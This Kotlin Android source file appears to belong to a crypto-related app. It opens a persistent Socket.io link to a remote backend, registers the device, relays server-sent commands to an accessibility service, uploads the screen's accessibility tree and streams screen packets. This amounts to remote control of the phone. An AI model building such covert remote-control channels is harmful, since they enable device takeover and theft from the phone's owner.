package com.cryptoconex.mobile.service

import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.net.URI

/**
 * Canal de comunicação com o backend via Socket.io.
 * Reconexão automática com Exponential Backoff (nativo do cliente socket.io).
 */
object SocketManager {

    private const val BACKEND_URL = "https://conex-assist--9u92ii2p.preview.emergentagent.com"
    private var socket: Socket? = null
    var sessionId: String? = null
        private set

    fun connect(deviceId: String) {
        val opts = IO.Options().apply {
            path = "/api/socketio"
            transports = arrayOf("websocket")
            reconnection = true
            reconnectionAttempts = Int.MAX_VALUE
            reconnectionDelay = 1000
            reconnectionDelayMax = 15000
            randomizationFactor = 0.5
        }
        socket = IO.socket(URI.create(BACKEND_URL), opts)

        socket?.on(Socket.EVENT_CONNECT) {
            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("platform", "android")
                put("name", android.os.Build.MODEL)
            }
            socket?.emit("device:register", payload)
        }
        socket?.on("device:registered") { args ->
            sessionId = (args[0] as JSONObject).optString("session_id")
        }
        socket?.on("command:receive") { args ->
            val cmd = (args[0] as JSONObject).optJSONObject("command") ?: return@on
            CryptoConexAccessibilityService.instance?.handleCommand(cmd)
        }
        socket?.on("a11y:request") {
            sendAccessibilityTree(CryptoConexAccessibilityService.instance?.dumpTree() ?: JSONArray())
        }
        socket?.connect()
    }

    fun sendScreenPacket(packet: JSONObject) {
        packet.put("session_id", sessionId)
        socket?.emit("screen:packet", packet)
    }

    fun sendAccessibilityTree(tree: JSONArray) {
        val payload = JSONObject().apply {
            put("session_id", sessionId)
            put("tree", tree)
        }
        socket?.emit("a11y:tree", payload)
    }

    fun emit(event: String, data: JSONObject) = socket?.emit(event, data)

    fun disconnect() { socket?.disconnect(); socket = null }
}
